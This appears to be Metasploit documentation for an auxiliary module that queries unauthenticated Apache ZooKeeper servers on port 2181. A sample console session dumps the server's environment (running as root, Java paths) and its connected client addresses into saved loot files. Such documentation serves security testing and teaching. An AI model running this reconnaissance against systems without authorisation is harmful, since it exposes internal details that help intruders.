### Description

This module targets Apache ZooKeeper service instances to extract information about the system environment, and service statistics.

### Verification Steps

```
msf5 > use auxiliary/gather/zookeeper_info_disclosure
msf5 auxiliary(gather/zookeeper_info_disclosure) > set rhosts 1.3.3.7
msf5 auxiliary(gather/zookeeper_info_disclosure) > show options

       Name: Apache ZooKeeper Information Disclosure
     Module: auxiliary/gather/zookeeper_info_disclosure
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2020-10-14

Provided by:
  Karn Ganeshen <KarnGaneshen@gmail.com>

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS   1.3.3.7          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT    2181             yes       The target port (TCP)
  THREADS  1                yes       The number of concurrent threads (max one per host)
  TIMEOUT  30               yes       Timeout for the probe

Description:
  Apache ZooKeeper server service runs on TCP 2181 and by default, it 
  is accessible without any authentication. This module targets Apache 
  ZooKeeper service instances to extract information about the system 
  environment, and service statistics.

References:
  https://zookeeper.apache.org/doc/current/zookeeperAdmin.html


msf5 auxiliary(gather/zookeeper_info_disclosure) > run

[*] 1.3.3.7:2181     - Using a timeout of 30...
[*] 1.3.3.7:2181     - Verifying if service is responsive...
[+] 1.3.3.7:2181     - Service looks fine. Going ahead with extraction..

[*] 1.3.3.7:2181     - Dumping environment info...
[+] 1.3.3.7:2181     - Environment:
zookeeper.version=3.4.9-1757313, built on 08/23/2016 06:50 GMT
host.name=localhost.localdomain
java.version=1.8.0_162
java.vendor=Oracle Corporation
java.home=/usr/lib/jvm/jdk1.8.0_162/jre
java.class.path=/var/lib/zookeeper/bin/../build/classes:/var/lib/zookeeper/bin/../build/lib/*.jar:/var/lib/zookeeper/bin/../lib/slf4j-log4j12-1.6.1.jar:/var/lib/zookeeper/bin/../lib/slf4j-api-1.6.1.jar:/var/lib/zookeeper/bin/../lib/netty-3.10.5.Final.jar:/var/lib/zookeeper/bin/../lib/log4j-1.2.16.jar:/var/lib/zookeeper/bin/../lib/jline-0.9.94.jar:/var/lib/zookeeper/bin/../zookeeper-3.4.9.jar:/var/lib/zookeeper/bin/../src/java/lib/*.jar:/var/lib/zookeeper/bin/../conf:
java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib
java.io.tmpdir=/tmp
java.compiler=<NA>
os.name=Linux
os.arch=amd64
os.version=3.10.62-ltsi
user.name=root
user.home=/root/
user.dir=/opt/data/zookeeper

[+] 1.3.3.7:2181       - File saved in: /root/.msf4/loot/20201013203537_default_1.3.3.7_environlog_604018.txt 

[*] 1.3.3.7:2181       - Dumping statistics about performance and connected clients...
[+] 1.3.3.7:2181       - Zookeeper version: 3.4.9-1757313, built on 08/23/2016 06:50 GMT
Clients:
 /1.3.3.6:33935[0](queued=0,recved=1,sent=0)
 /1.3.3.13:39682[1](queued=0,recved=526446,sent=526446)
 /1.3.3.12:60371[1](queued=0,recved=526234,sent=526279)
 /1.3.3.12:60373[1](queued=0,recved=596717,sent=596727)
 /1.3.3.13:51193[1](queued=0,recved=78915,sent=78917)
 /1.3.3.13:49457[1](queued=0,recved=538585,sent=540938)

Latency min/avg/max: 0/0/20
Received: 2267148
Sent: 2269515
Connections: 6
Outstanding: 0
Zxid: 0x300000c6c
Mode: follower
Node count: 1041

[+] 1.3.3.7:2181       - File saved in: /root/.msf4/loot/20201013203537_default_1.3.3.7_statlog_417795.txt

[*] 1.3.3.7:2181       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf5 auxiliary(gather/zookeeper_info_disclosure) > 
msf5 auxiliary(gather/zookeeper_info_disclosure) > loot

Loot
====

host           service  	type         	name             content     	info       path
----           -------  	----         	----             -------    	----       ----
1.3.3.7        environ-log  	ZooKeeper 	Environment Log  text/plain  	ZooKeeper  /root/.msf4/loot/20201013203537_default_1.3.3.7_environlog_604018.txt 
1.3.3.7        stat-log     	ZooKeeper 	Stat Log         text/plain  	ZooKeeper  /root/.msf4/loot/20201013203537_default_1.3.3.7_statlog_417795.txt


msf5 auxiliary(gather/zookeeper_info_disclosure) > services 
Services
========

host       port  proto  name       state  info
----       ----  -----  ----       -----  ----
1.3.3.7    2181  tcp    zookeeper  open   Apache Zookeeper: 3.4.13-2--1

msf5 auxiliary(gather/zookeeper_info_disclosure) > hosts

Hosts
=====

address        mac   name        os_name  os_flavor  os_sp  purpose  info  comments
-------        ---   ----        -------  ---------  -----  -------  ----  --------
1.3.3.7              localhost   Linux    device                           Linux amd64 3.10.0-1062.12.1.el7.x86_64


```



